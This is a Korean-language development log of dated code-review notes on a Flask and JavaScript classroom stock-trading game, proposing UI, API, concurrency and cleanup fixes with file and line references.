- **폭탄뉴스 팝업 수동 닫기 불가** (`app.js:619-647`): 팝업이 3초 후 자동으로 사라지고(`app.js:644`) 학생이 직접 닫을 수 없음. 읽는 속도가 느린 학생은 내용을 놓침. 팝업 우상단에 `×` 버튼을 추가해 `_newsPopupTimer`를 클리어하고 팝업을 즉시 숨길 수 있게 하거나, 클릭 시 팝업이 닫히도록 `onclick` 핸들러를 `.bomb-news-inner`에 추가하는 것이 가장 간단한 해법 (`index.html:533-546`).

- **`get_history()` 1년 차트 봉 수 부족** (`stock_service.py:207`, `app.py:335`): `n_bars` 딕셔너리에 `'1y'` 키가 없어 기본값 30이 적용됨. UI에서 "1년" 탭을 누르면 30개 봉이 표시되지만 1년치 주간 데이터라면 최소 52개 봉이 필요. `stock_service.py:207` 딕셔너리에 `'1y': 52`를 추가하면 해결. 함께 `'1d': 78`(5분봉 기준 6.5시간)처럼 기간별 봉 수를 의미 있게 재정의하면 더 완성도 있는 차트 제공 가능.

- **진행자가 개별 참여자 포트폴리오 확인 불가** (`app.py:204-221`, `index.html:134-140`): 진행자 순위 화면에서 학생 이름을 눌러도 해당 학생의 보유 종목 내역이 보이지 않음. 수업 중 교사가 특정 학생의 투자 전략을 확인하거나 설명할 때 유용함. `GET /api/rooms/<rid>/host/member-portfolio?uid=<uid>` 엔드포인트를 추가하고 `host-member-row` 클릭 시 모달로 보유 종목 목록을 표시하면 교육적 활용도가 높아짐.

- **엑셀 내보내기가 게임 진행 중에도 호출 가능** (`app.py:632-701`): `export_rankings()`는 `room.host_id == user.id` 체크만 하고 `room.status`를 확인하지 않음. 게임 중간에 다운로드하면 부분적인 최종 자산이 "결과"로 저장될 수 있음. `if room.status != 'ended'` 조건을 추가하거나 경고 헤더(`X-Game-Status: active`)를 응답에 포함해 교사에게 알리는 방안 권장.

---

### 제거/단순화할 것들

- **`force_price()` 구(舊) 타임스탬프 보존으로 강제 가격이 즉시 덮여쓰임** (`stock_service.py:179`): `self._prices[symbol] = (ts, new_price)`에서 기존 `ts`를 재사용하므로, 가격 TTL이 이미 만료된 종목이라면 다음 `get_price()` 호출 시 즉시 새 가격으로 덮어씌어져 교사의 강제 조정이 사라짐. `(ts, new_price)` 대신 `(time.time(), new_price)`로 교체하면 강제 조정 후 최소 `_price_ttl`(기본 20초)이 유지됨.

- **`setDepPct()` 함수가 스테일 `S.depCash` 캐시를 사용** (`app.js:1022-1027`): "10%/25%/50%/전액" 버튼이 `S.depCash`를 기준으로 금액을 계산하는데, `S.depCash`는 거래 완료 또는 예금 페이지 재진입 시에만 갱신됨. 학생이 시장 탭에서 주식을 매도해 현금이 늘어난 뒤 예금 탭으로 오면 이전 현금 기준으로 계산된 금액이 입력되어 혼란을 줌. `loadDepositsPage()` 내에서 `S.depCash = port.cash`를 이미 수행하므로(`app.js:1050`) 버튼은 `S.depCash`가 아닌 해당 함수 완료 후 표시된 값을 참조하도록 초기화 순서를 보장하거나, 매번 `setDepPct()` 호출 시 `dep-cash-display` DOM에서 최신값을 파싱하는 방식으로 단순화 가능.

- **`doAuth()` 이미 세션이 있는 경우에도 매번 API 호출** (`app.js:58-65`, `app.js:110`, `app.js:130`): `doCreateRoom()`과 `doJoinRoom()` 모두 `doAuth(sid, name)`를 항상 호출함. 이미 `S.user`가 설정되어 있고 사용자명이 동일한 경우에도 `POST /api/auth/enter`가 실행됨. 한 학생이 같은 이름으로 두 번 입장하면 문제없지만, 만약 앞서 방에 참여했다가 새로 입력하는 경우 의도치 않게 다른 계정이 만들어질 수 있음. `if (S.user && S.user.username === \`${sid} ${name}\`) { /* skip doAuth */ }` 가드를 추가하면 불필요한 왕복 요청 1건 절약.

- **진행자 바차트 y축 이름 잘림 (30명 이상 시)** (`app.js:350`, `app.js:328-365`): `y: {ticks: {color: '#e6edf3'}}` 설정에 `maxTicksLimit`이나 `callback`이 없어 학생이 많아질수록 이름이 겹치거나 잘림. `ticks: { callback: (_, i) => labels[i]?.length > 8 ? labels[i].slice(0,8)+'…' : labels[i], font:{size:10} }` 형태로 이름을 잘라주거나, 학생 수가 15명 초과 시 차트 컨테이너 높이를 `members.length * 28`px로 동적 조정하면 가독성 향상. `app.js:329` 참조.

- **`enterParticipantGame()` 페이지 초기화 루프 후 불필요한 `querySelector` 호출** (`app.js:437-445`, `app.js:443`): `PAGE_ORDER.forEach` 루프 후 `document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'))`와 `document.getElementById('nav-market').classList.add('active')` 두 줄이 나오는데, 게임에 처음 입장하는 경우 `.nav-item.active`는 항상 `nav-market`이어야 하므로 루프 전체를 `document.querySelectorAll('#screen-p-game .page').forEach(p => p.setAttribute('hidden',''))` + `document.getElementById('pg-market').removeAttribute('hidden')` 두 줄과 nav 리셋 1회로 단순화 가능 (어제 제안과 연계, 실제 코드 변경은 간단함).

---

## 2026-06-14

### 추가하면 좋을 기능

- **종목 목표가/손절가 알림** (`app.js:784-796`, `app.js:868-879`): 학생이 특정 종목에 목표가 또는 손절가를 설정해 두면 `loadMarket()` 완료 후 현재가와 비교해 `toast('⚡ 삼성전자 목표가 달성!', 'success')`를 표시하는 기능. `localStorage`에 `{ symbol: {target, stopLoss} }` 형태로 저장하고, `renderGrid()` 종료 시 `S.stocks` 가격과 비교하는 것만으로 서버 변경 없이 구현 가능. 관심 종목(watchlist) 스타 버튼 옆에 "알림 설정" 버튼을 추가하면 자연스럽게 통합됨.

- **배당금 지급 이벤트 (진행자용)** (`app.py:669-684` market-event 구조 참조): 진행자가 특정 종목 보유자 전원에게 주당 일정 금액을 지급하는 `POST /api/rooms/<rid>/host/dividend` 엔드포인트 추가. `RoomHolding.query.filter_by(room_id=rid, symbol=symbol)` → `member.cash += h.shares * amount_per_share` + `RoomTransaction(action='ADJ', note='배당금')` 기록. 현재 섹터 이벤트 API와 같은 구조로 50줄 미만 코드로 구현 가능하며, 배당 개념을 교실에서 실체감 있게 체험할 수 있는 교육 효과가 큼.

- **실시간 거래 피드 (진행자 대시보드)** (`app.py:504-522`, `index.html:138-145`): `GET /api/rooms/<rid>/host/recent-trades?limit=10`으로 방 전체 최근 거래 10건을 반환하는 엔드포인트를 추가하고, 진행자 순위 탭 하단에 "최근 거래 피드" 패널 표시. `RoomTransaction`을 타임스탬프 역순으로 조회해 `{username, action, symbol, shares, amount, timestamp}`를 반환하면 충분. 어떤 학생이 어떤 종목을 대량 매수/매도하는지 즉시 파악해 교사가 "지금 OO이 삼성전자를 전량 매도했네요, 왜 그랬을까요?" 식의 수업 개입 포인트를 실시간으로 찾을 수 있음.

- **순위 변화 화살표 시각화** (`app.js:374-395`, `app.js:1219-1236`): `loadHostMembers()` / `loadParticipantRankings()` 응답을 수신할 때마다 이전 순위를 `S.prevHostRanks`, `S.prevRanks` 딕셔너리에 저장하고, 다음 렌더링 시 `delta = prevRank - curRank`를 계산해 상승(`▲+N`)·하락(`▼-N`) 뱃지를 이름 옆에 표시. 서버 변경 없이 클라이언트에서만 구현 가능하며, 순위표에 역동성이 생겨 학생 참여도가 높아짐. `app.js:383`의 `gain_pct` 스팬 바로 앞에 `<span class="rank-delta">${...}</span>` 한 줄 추가.

- **학생 마지막 접속 시간 표시** (`models.py:44-51`, `app.py:483-499`): `RoomMember`에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고, `GET /api/rooms/<rid>/rankings` 또는 `GET /api/rooms/<rid>/portfolio` 호출 시 해당 멤버의 `last_seen`을 `datetime.utcnow()`로 갱신. 진행자 순위 목록에서 현재 시각 기준 3분 이내 접속은 🟢, 이상은 ⚫로 표시하면 누가 앱을 닫았는지 즉시 파악 가능 (`app.py:254`에 `last_seen` 필드 포함). 특히 시험처럼 집중력이 필요한 상황에서 유용.

- **포트폴리오 투자 메모장** (`index.html:pg-portfolio`, `app.js:1003`): 포트폴리오 탭 거래 내역 위에 `<textarea placeholder="왜 이 종목을 샀나요?">` 하나를 추가하고 `localStorage.setItem('memo-' + S.room.id, text)`로 저장. 게임 종료 후 교사가 "각자 왜 이 종목을 선택했나요?"라는 토론을 진행할 때 학생이 메모를 보며 발표하는 수업 활동과 연계 가능. 서버 저장 없이 10줄 이내 구현 가능하며, 방 ID를 키에 포함해 여러 게임의 메모를 구분함.

---

### 제거/단순화할 것들

- **`force_sector_event()` 구 타임스탬프 재사용** (`stock_service.py:213`): 2026-06-13에 `force_price()`의 동일 버그를 지적했으나, `force_sector_event()` 루프 내부도 `self._prices[sym] = (ts, new_price)`에서 기존 `ts`를 그대로 재사용함. 섹터 이벤트 적용 직후 TTL이 이미 만료된 종목은 다음 `get_price()` 호출에서 즉시 새 무작위 가격으로 덮어씌어져 교사의 이벤트 효과가 사라짐. `stock_service.py:213`을 `self._prices[sym] = (time.time(), new_price)`로 교체하면 `force_price`와 동일하게 해결.

- **`api` 객체 HTTP 에러 응답 미처리** (`app.js:24-30`): `api.get()`·`api.post()`가 `(await fetch(url)).json()`을 직접 호출해 HTTP 상태 코드를 확인하지 않음. 서버가 500 에러로 HTML 오류 페이지를 반환하거나 네트워크 오류가 발생하면 `.json()` 파싱 실패로 처리되지 않은 `SyntaxError`가 발생해 UI가 조용히 멈춤. `const r = await fetch(url, opts); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 `api.get`/`api.post`/`api.del` 모두 3줄 수정으로 안정성 대폭 향상.

- **`enterHostGame()` 퀴즈 설정값 미로드** (`app.js:227-241`, `app.py:688-696`): `enterHostGame()`이 `loadNewsInterval()`은 호출해 뉴스·주가 주기를 복원하지만, `GET .../host/quiz-settings`는 호출하지 않음. 진행자가 퀴즈 보상/패널티를 저장한 후 탭을 전환하거나 재접속하면 `quiz-reward-input`과 `quiz-penalty-input`이 항상 1.0%/0.5% 기본값으로 표시됨. `app.js:234` 이후에 `api.get(\`/api/rooms/\${S.room.id}/host/quiz-settings\`).then(d => { if (!d.error) { document.getElementById('quiz-reward-input').value = d.reward_pct; document.getElementById('quiz-penalty-input').value = d.penalty_pct; } });` 한 블록을 추가하면 해결.

- **일시정지 상태에서도 주가 계속 변동** (`stock_service.py:136-153`, `app.py:203-228`): `pause_room()`이 게임을 일시정지해도 학생 폴링(`GET /api/rooms/<rid>/stocks`)이 `svc.get_price()`를 호출해 TTL마다 가격이 계속 변동함. 교사가 "지금부터 주가 고정"을 의도하고 일시정지해도 효과 없음. `StockService`에 `_frozen: bool` 속성과 `freeze()`/`unfreeze()` 메서드를 추가하고, `get_price()` 내 TTL 만료 분기 첫 줄에 `if self._frozen: return price`를 삽입. `pause_room()` (`app.py:203`)과 `resume_room()` (`app.py:215`)에서 각각 `svc.freeze()` / `svc.unfreeze()` 호출.

- **`doDeposit()` · `doWithdraw()` 이중 제출 방지 없음** (`app.js:1192-1215`): 2026-06-12에 `execTrade()` 이중 클릭 문제를 지적했으나, 예금/해지 버튼에도 동일 취약점이 있음. 느린 네트워크에서 "예금하기"를 두 번 클릭하면 동일 금액이 두 번 예금되고, `doWithdraw()`를 두 번 클릭하면 첫 번째 성공 후 두 번째는 `'이미 처리된 예금'` 에러가 나지만 UX를 혼란스럽게 함. `app.js:1196`과 `app.js:1209`에서 API 호출 직전 버튼 `disabled = true`, 응답 후 `disabled = false`를 추가하거나, 모듈 수준 `let _depInFlight = false` 가드를 함수 진입 시 확인하는 방식으로 방지 가능.

- **`Room.query.get_or_404(rid)` 폐기 패턴 전체** (`app.py:184,192,203,215,231,245,265,276,287,307,329,350,366,381,388,399,449,484,506,527,554,558,580,620,636,669,687,708` 등 30여 곳): 2026-06-10에 `User.query.get()` → `db.session.get()` 교체를 권장했으나, 모든 라우트의 `Room.query.get_or_404(rid)`는 그대로 남아 있음. Flask-SQLAlchemy 3.1+에서는 `db.get_or_404(Room, rid)` 패턴을 권장함. 에디터 전체 치환(`Room.query.get_or_404` → `db.get_or_404(Room,`)으로 30초 안에 30여 군데를 일괄 수정 가능하며, SQLAlchemy 2.x 마이그레이션 준비에도 도움.

---

## 2026-06-14 (2차)

### 추가하면 좋을 기능

- **CDN 의존성 → 학교 네트워크 단절 위험** (`index.html:600-602`): Chart.js와 qrcodejs를 `cdn.jsdelivr.net`에서 동적으로 로드함. 한국 학교 인트라넷은 외부 CDN을 차단하거나 네트워크가 불안정한 경우가 잦아, 차트가 전혀 그려지지 않거나 QR코드가 생성되지 않을 수 있음. `npm run build`나 `wget`으로 두 파일을 `static/vendor/`에 미리 내려받아 자체 호스팅하면 CDN 의존 없이 수업 진행 가능.

- **거래 횟수 제한(Rate Limiting) 없음** (`app.py:399-442`): `POST /api/rooms/<rid>/trade`에 사용자·시간 단위 제한이 없어 학생이 스크립트(또는 빠른 반복 클릭)로 초당 수십 건 거래를 실행할 수 있음. 서버 DB에 과부하를 줄 뿐 아니라 게임 공정성도 훼손됨. 가장 간단한 방법은 Flask-Limiter(`pip install flask-limiter`)로 `@limiter.limit("10 per second")` 한 줄 추가하거나, `RoomMember`에 `last_trade_at` 컬럼을 두고 1초 이내 재거래 시 400을 반환하는 방식으로 서버 측 쿨다운 구현.

- **게임 시작 시 최소 인원 체크 없음** (`app.py:189-201`, `app.js:215-224`): `start_room()`은 참여자가 0명이어도 게임을 시작함. 교사가 코드를 배포하기 전에 실수로 "게임 시작"을 누르면 학생들이 없는 상태로 타이머가 시작됨. `RoomMember.query.filter_by(room_id=rid).count()` < 1이면 `{'error': '참여자가 없습니다. 학생이 입장한 후 시작하세요.'}` 로 응답하거나, 프론트에서 `data.member_count === 0`일 때 `doStartGame()` 확인 메시지에 경고를 포함하는 것으로 간단히 방지 가능.

- **종목 모달에서 매도 확인 단계 없음** (`app.js:978-1000`, `index.html:543-546`): 매수는 금액·수량을 보고 버튼을 누르지만, 매도도 동일한 한 번의 탭으로 즉시 실행됨. 보유 수량이 많을 때 실수로 "전량 매도" 후 `setMaxSell()`을 눌러 전액 매도하는 상황이 수업 중 빈번히 발생할 수 있음. 매도 금액이 보유 현금의 30% 이상이면 `confirm('정말 ${shares}주를 매도할까요?')`를 표시하는 조건부 확인 로직을 `execTrade('SELL')` 첫 줄에 추가 권장.

- **진행자 대시보드에 방 설정 정보(초기 자금·게임 시간) 표시 없음** (`index.html:114-135`): 호스트 게임 화면 상단 바(`host-topbar`)에 방 이름·코드·타이머만 있고 초기 자금·총 게임 시간이 없음. 수업 도중 학생이 "제 시작 자금이 얼마예요?" 물을 때 교사가 별도 확인할 방법이 없음. `<div style="font-size:10px">${krw(S.room.starting_cash)} · ${S.room.duration_minutes}분</div>`을 `host-topbar` 방 이름 아래에 한 줄 추가하는 것으로 즉시 해결 가능 (`app.js:228-229`).

---

### 제거/단순화할 것들

- **뉴스 폴링 주기 하드코딩 3초 vs 서버 설정값 불일치** (`app.js:613-624`): 클라이언트는 3초마다 `GET /api/rooms/<rid>/news`를 호출하지만, 서버의 `_news_ttl`은 진행자가 5~300초로 자유롭게 설정 가능. 참여자 30명 × 20회/분 = 600 req/min이 뉴스 조회에만 소비됨. `loadNewsInterval()`에서 이미 `news_seconds`를 받아오므로 (`app.js:351-355`), 참여자 측에서도 첫 `get_room()` 응답에 `news_interval_seconds`를 포함시키거나 별도 쿼리로 받아와 `setInterval(…, news_seconds * 1000)`으로 동적 설정하면 불필요한 요청이 크게 줄어듦.

- **`doEndGame()` API 호출 중 버튼 비활성화 없음** (`app.js:468-476`): `doStartGame()`은 `btn.disabled = true`로 이중 클릭을 방어하지만(`app.js:217-219`), `doEndGame()`에는 동일 처리가 없음. 교사가 종료 버튼을 두 번 클릭하면 첫 번째 `_end_room()`이 예금을 정산하는 도중 두 번째 호출이 `room.status == 'ended'` 체크를 통과해 충돌할 수 있음. `document.querySelector('.btn-danger[onclick="doEndGame()"]').disabled = true` 한 줄을 `doEndGame()` 첫 줄에 추가하면 방지 가능.

- **종료된 방에서 `get_stocks()` 호출 시 새 StockService 생성** (`app.py:327-347`, `stock_service.py:280-284`): `_end_room()`이 `cleanup_room_service(room.id)`를 호출해 서비스를 제거하지만, 결과 화면 도달 전 잠깐 `GET /api/rooms/<rid>/stocks`를 호출하는 경우 `get_room_service(rid)`가 새로운 StockService 인스턴스를 생성해 완전히 다른 무작위 가격을 반환함. `get_stocks()` 맨 앞에 `if room.status == 'ended': return jsonify({'stocks': [], 'sectors': SECTORS})` 체크를 추가하면 불필요한 인스턴스 생성 없이 깔끔하게 처리 가능 (`app.py:330` 직후).

- **`find_active_room()` 이중 쿼리** (`app.py:92-98`): `GET /api/auth/me`가 호출될 때마다 host 체크 쿼리와 member 체크 쿼리를 순차 실행함. 참여자가 많아지면 두 번째 `RoomMember.query.join(Room)` 쿼리에 JOIN 비용이 더해짐. 단일 `UNION` 쿼리 또는 ORM subquery로 통합하거나, 적어도 `Room` 인스턴스를 캐싱해 두 번째 쿼리의 `db.session.get(Room, m.room_id)` 호출을 생략하면 왕복 쿼리 1건 절약.

- **`loadPLobbyMembers()`의 `.catch(() => [])` 로 403 에러 무시** (`app.js:499`): 2026-06-12에 지적된 참여자 로비 멤버 목록 버그(403 반환)가 여전히 수정되지 않은 채 `.catch(() => [])` 가드로 조용히 실패 중. 지금은 "대기 중인 참여자 0명"이 항상 표시됨. 단기 해결책으로 `app.py:275-285`의 `lobby_members` 엔드포인트에서 `if room.host_id != user.id:` 체크를 제거하고 `@login_required`만 남기면 참여자도 로비 목록을 볼 수 있음 — 목록 조회는 민감 정보가 아니므로 보안 위험 없음.

---

## 2026-06-14 (3차)

### 추가하면 좋을 기능

- **일시정지 중 매수/매도 버튼 비활성화** (`app.js:548-561`, `app.js:863-876`): 진행자가 게임을 일시정지하면 배너(`showPausedBanner()`)는 표시되지만 주식 모달의 매수/매도 버튼은 여전히 활성 상태. 서버의 `trade()` 엔드포인트가 `paused` 상태를 체크하더라도, 학생 입장에서는 버튼이 눌리는 것처럼 보여 혼란 유발. `showPausedBanner()` 내에서 `.btn-success, .btn-danger`를 `disabled = true`로 설정하고, `hidePausedBanner()` 시 복원하면 UX와 로직이 일치함.

- **진행자 개별 학생 거래 내역 확인** (`app.js:272-337`, `index.html:134-143`): 진행자 순위 화면에서 학생 행을 클릭해도 아무 반응 없음. `GET /api/rooms/<rid>/host/member-portfolio?uid=<uid>` 엔드포인트를 추가하고 `host-member-row` 클릭 시 해당 학생의 보유 종목·평가 손익을 모달로 표시하면 교사가 수업 중 특정 학생의 투자 전략을 설명 자료로 활용 가능.

- **게임 재진입(새로고침) 시 화면 복원** (`app.js:1505-1511`, `app.py:80-90`): 학생이 실수로 브라우저를 새로고침하면 `screen-landing`으로 돌아가 방 코드를 다시 입력해야 함. `localStorage`에 `{roomId, userId}`를 저장해 두고, 페이지 로드 시 `GET /api/rooms/<rid>` 상태가 `active`면 자동으로 게임 화면으로 복원하면 수업 중 실수로 인한 이탈을 방지할 수 있음 (`app.js:1505` `window.onload` 블록에 추가).

- **거래 후 모달 수량 초기화 누락** (`app.js:972-999`, `index.html:538-541`): `execTrade()` 성공 후 수량 입력(`trade-qty`)이 이전 값을 유지해, 학생이 바로 다시 거래하려 할 때 직전 수량이 그대로 남아 있음. 성공 콜백에서 `document.getElementById('trade-qty').value = 1`과 `updateTotal()`을 호출해 수량과 예상 금액을 초기화하면 이중 주문 실수를 줄일 수 있음.

- **섹터 필터 선택 상태가 모달 닫기 후 초기화됨** (`app.js:784-826`, `index.html:318-323`): 학생이 "반도체" 섹터를 선택한 뒤 종목 모달을 열었다 닫으면 필터가 해제되고 전체 목록이 다시 표시됨. `closeModal('modal-stock')` 시 `S.curSector` 상태를 유지하고 `renderGrid()`를 해당 필터로 재렌더링하면 여러 종목을 연속 비교할 때 편의성 향상.

- **예금 만기 도달 시 자동 알림 없음** (`app.js:527-545`, `app.py:456-489`): 예금이 만기되어 이자가 지급되더라도 학생에게 별도 알림이 없음. 폴링 응답에 `matured_deposits: [{symbol, interest}]` 필드를 추가하고, 만기 예금이 있으면 폭탄뉴스와 유사한 팝업("예금 만기! 이자 ₩XXX 지급")을 표시하면 학생이 예금 전략의 결과를 즉시 인식 가능 (`app.js:530` 폴링 응답 처리 부분에 추가).

---

### 제거/단순화할 것들

- **`execTrade()` 성공 후 중복 DOM 갱신** (`app.js:985-999`): 거래 성공 시 `ms-cash` DOM을 `data.cash`로 직접 갱신한 직후 `refreshMyRank()`를 호출해 같은 값을 다시 API로 가져와 덮어씀. `ms-cash` 직접 갱신을 제거하고 `refreshMyRank()` 응답으로만 헤더·모달 현금을 업데이트하면 API 왕복 없이 코드가 단순해짐.

- **`loadMarket()` 매 호출마다 전체 종목 재요청** (`app.js:784-796`, `app.py:328-345`): 섹터 필터 변경·검색어 입력 시마다 `loadMarket()`이 전체 종목을 다시 받음. 종목의 심볼·이름·섹터는 불변이므로 초기 1회 전체 로드 후 `S.stocks` 캐시에 저장하고 이후 필터링은 로컬에서만 수행하면 요청 횟수와 응답 크기를 크게 줄일 수 있음.

- **`room_dict()` 매 호출 시 호스트명 DB 재조회** (`app.py:70-90`): `room_dict()`는 `db.session.get(User, room.host_id)`로 호스트 이름을 매번 조회함. `get_room()`, `get_rankings()` 등 다수 엔드포인트가 이 함수를 호출하므로 불필요한 SELECT가 반복 발생. `Room` 모델에 `host_name = db.Column(db.String(50))` 컬럼을 추가해 방 생성 시 한 번만 저장하면 조인 없이 해결 가능.

- **Chart.js 인스턴스 미정리로 인한 메모리 누수** (`app.js:1032`, `app.js:398-403`): `S.portChart`, `S.assetLineChart` 등은 `loadPortfolio()` 재호출 시 `destroy()` 가드가 있지만, `showScreen()` 또는 `goHome()`으로 화면을 전환할 때는 cleanup 없이 방치됨. `showLanding()` 내에서 `[S.portChart, S.assetLineChart, S.hostBarChart, S.resultsBarChart].forEach(c => c?.destroy())` 한 줄 추가만으로 해결 가능.

- **시간 포맷 함수 중복 구현** (`app.js:569-581`, `app.js:583-604`): 타이머(`startTimer`), 진행자 타이머, 결과 화면 등에서 `mm:ss` 포맷을 `String(m).padStart(2,'0')` 패턴으로 반복 구현. `function fmtMSS(sec){ const m=Math.floor(sec/60),s=sec%60; return \`${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}\`; }` 유틸 함수 하나로 통합하면 약 10줄 이상의 중복 코드 제거 가능.

---

## 2026-06-14 (4차)

### 추가하면 좋을 기능

- **복권 참여자 제출 현황 진행자에게 실시간 표시** (`app.py:798-812`, `index.html:704-708`): 진행자의 `lhost-picking-section`은 "참가자 번호 선택 중..."과 남은 시간만 표시하고, 실제로 몇 명이 번호를 제출했는지 전혀 알 수 없음. `GET /api/rooms/<rid>/lottery` 응답(`app.py:808` 직전)에 `picks_count: len(cur.get('picks', {}))` 필드를 추가하고, 진행자 패널에 "X/Y명 제출" 카운터를 표시하면 진행자가 "이제 추첨해도 되겠다"를 스스로 판단 가능. 3초 폴링이 이미 동작 중이므로 서버 1줄 + 클라이언트 1줄 추가만으로 구현 가능.

- **룰렛 스핀 애니메이션 중 오버레이 강제 닫기 방지** (`app.js:947`, `app.js:993-995`): `doRouletteSpin()`이 `await new Promise(r => setTimeout(r, 4300))`로 4.3초를 대기하는 동안 사용자가 오버레이 배경을 탭하면 `roulette-overlay`가 닫히고, 이후 `rlt-result` / `rlt-again-btn` DOM 조작이 숨겨진 요소에서 발생해 결과가 화면에 나타나지 않음. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 한 줄만 추가하면 방지 가능. 기존에 `_rltSpinning` 플래그가 이미 있으므로 별도 상태 추가 불필요.

- **해외 주식 원화 환산 기준 배지 및 국가 구분** (`stock_service.py:78-97`, `app.js:1148-1165`): 해외 주식 15개(Apple 270,000원, NVIDIA 160,000원 등)가 국내 종목과 동일한 카드 레이아웃으로 표시되어 학생들이 "이게 실제 달러 가격인가요?"라는 혼란이 발생할 수 있음. `renderGrid()` 내에서 `st.sector`가 `'해외IT'`, `'해외반도체'`, `'전기차'`, `'일본'`, `'중국IT'` 중 하나이면 종목명 앞에 국기 이모지(🇺🇸/🇯🇵/🇨🇳)를 추가하거나, 카드 우측 하단에 `<span style="font-size:9px;color:var(--muted)">KRW환산</span>` 배지를 붙이면 서버 변경 없이 교육적 명확성 향상.

- **복권 추첨 타이머 만료 자동 처리 서버 독립성 부재** (`app.py:789-795`): `picking → drawing` 전이와 `drawing → revealed` 전이가 모두 `GET /api/rooms/<rid>/lottery` 폴링 요청 처리 중 타임스탬프 비교로 발생함. 진행자·참여자가 모두 탭을 닫거나 네트워크가 끊기면 타이머가 만료돼도 상태 전이가 일어나지 않아 복권이 `drawing` 상태로 영구 정지됨. 다음 접속 때 폴링이 재시작되면 자동 복구되지만, 이 동안 새로 접속한 학생은 복권이 진행 중인지 알 수 없음. `lottery_start()` (`app.py:778`) 시점에 `threading.Timer(LOTTO_PICK_SECS + LOTTO_DRAW_SECS + 5, lambda: _auto_close(rid, cur_round))`를 등록하는 방식으로 서버 독립 자동 마감 구현 권장.

- **20개 이상 섹터 나열로 인한 섹터 필터 UX 저하** (`app.js:1097-1102`, `stock_service.py:99`): 최근 해외 주식 15개 추가로 섹터 수가 `반도체`, `IT`, `자동차`, `배터리`, `바이오`, `제약`, `금융`, `통신`, `전자`, `철강`, `해운`, `에너지`, `엔터`, `게임`, `건설`, `지주`, `해외IT`, `해외반도체`, `전기차`, `일본`, `중국IT` 등 20여 개에 달함. 현재 `renderSectors()`는 이를 한 줄 가로 스크롤로 나열해 모바일 화면에서 탐색이 매우 불편함. 국내/해외를 먼저 탭으로 분류하거나, 섹터 선택을 드롭다운(`<select>`)으로 대체하면 화면 공간을 절약하면서 탐색이 빨라짐.

- **`lottery_start()` 상금 최대값 검증 없음** (`app.py:769`): `prize = float(d.get('prize', 0))`에 상한선이 없음. 진행자가 입력 실수로 `500000000`(5억)을 입력하면 6개 번호 모두 맞춘 학생에게 5억이 지급되어 게임 밸런스가 무너짐. `if prize > room.starting_cash * RoomMember.query.filter_by(room_id=rid).count(): return jsonify({'error': '상금이 너무 큽니다'}), 400` 형태의 상한선 또는 `index.html:691`의 입력 필드에 `max` 속성 추가 권장.

---

### 제거/단순화할 것들

- **`RLT_SEGS` 상수 — 완전한 dead code** (`app.js:816-822`): `const RLT_SEGS = [{label:'꽝',...}, ...]` 7줄이 선언되어 있지만 `openRouletteModal()`, `doRouletteSpin()`, `updateRltLegend()`, `updateRltWheel()` 어디서도 이 변수를 참조하지 않음. 스핀 결과의 회전 각도는 서버 응답 `data.seg_start/data.seg_end`를 직접 사용하고(`app.js:937`), 범례는 `data.multipliers/data.weights`를 사용함. 룰렛 배율 진행자 설정 기능 추가 시 이 상수가 남겨진 것으로 보이며 완전히 삭제 가능.

- **`_lots[rid]['done']`이 Python `set` — JSON 직렬화 불호환** (`app.py:71`, `app.py:108-109`): `_lots.setdefault(rid, {}).setdefault('done', set()).add(cur['round'])` 패턴에서 `done` 값이 Python `set`임. `json.dumps(_lots)`를 호출하면 `TypeError: Object of type set is not JSON serializable`가 발생함. 현재 코드에서 이 딕셔너리를 직접 직렬화하지 않아 문제가 없지만, 로깅·디버깅 또는 향후 캐시 직렬화 시 즉시 폭발. `_lots[rid] = {'done': []}` 초기화로 통일하고 중복 추가는 `if round_n not in done: done.append(round_n)` 패턴으로 교체 권장.

- **`_showLotParticipantPicker()` 매 3초 그리드 45개 버튼 재렌더링** (`app.js:1980-2003`, `app.js:1823`): `picking` 상태 60초 동안 3초 폴링으로 최대 20회 `_renderLotGrid('lottery-picker-grid', _lotParticipantPicks, ...)` 호출 → 매번 45개 버튼 DOM을 삭제 후 재생성. `app.js:1982-1985`에 이미 `overlay.style.display === 'flex' && picker-section이 표시 중`이면 `_lotCountdown()` 업데이트만 하고 조기 반환하는 로직이 있지만, 그 블록 밖에서도 `_renderLotGrid()` 호출이 남아 있음 (`app.js:1994`). `_lotPickerSubmitted`이거나 그리드에 이미 버튼이 있으면 카운트다운만 업데이트하고 그리드 재렌더링은 건너뛰도록 조건 추가 필요.

- **`loadParticipantRankings()` 매 호출마다 스피너로 목록 초기화** (`app.js:1528-1529`): 순위 탭이 열린 상태에서 5초 폴링마다 `list.innerHTML = '<div class="loading-center"><span class="spinner"></span></div>'`로 기존 내용을 스피너로 덮어씌워 목록이 깜빡임. `loadHostMembers()`처럼 데이터를 먼저 받아온 뒤 조용히 갱신하거나, `if (!list.children.length)` 조건으로 초기 로딩 시에만 스피너를 표시하면 깜빡임 없이 부드러운 업데이트 가능.

- **`host_adjust()` `user_id` 누락 시 불필요한 DB 쿼리 실행** (`app.py:374-378`): `target_uid = d.get('user_id')`가 JSON에 없으면 `None`이 되고, `RoomMember.query.filter_by(room_id=rid, user_id=None).first()`는 `WHERE user_id IS NULL`로 번역되어 의미 없는 쿼리가 실행됨. 결과가 None이면 404로 처리되므로 최종 동작은 맞지만, `if not target_uid: return jsonify({'error': 'user_id 필요'}), 400`으로 조기 반환하면 DB 쿼리를 줄이고 오류 원인도 명확해짐.

- **`_renderLotGrid()` `onclick="${clickFn.name}(this,${i})"` 함수명 문자열 의존** (`app.js:1938`): `clickFn.name` 프로퍼티를 onclick 속성값으로 직접 삽입함. 향후 빌드 도구로 코드를 minify하면 함수가 `a`, `b` 등으로 축소되어 `onclick="a(this,1)"` 같은 형태가 되어 전역 함수 탐색 실패. 이벤트 위임으로 교체(`container.addEventListener('click', e => { const btn = e.target.closest('.lottery-num'); if (btn) clickFn(btn, parseInt(btn.textContent)); })`)하면 minify에 안전하고 45개 이벤트 리스너 대신 1개로 절약 가능.

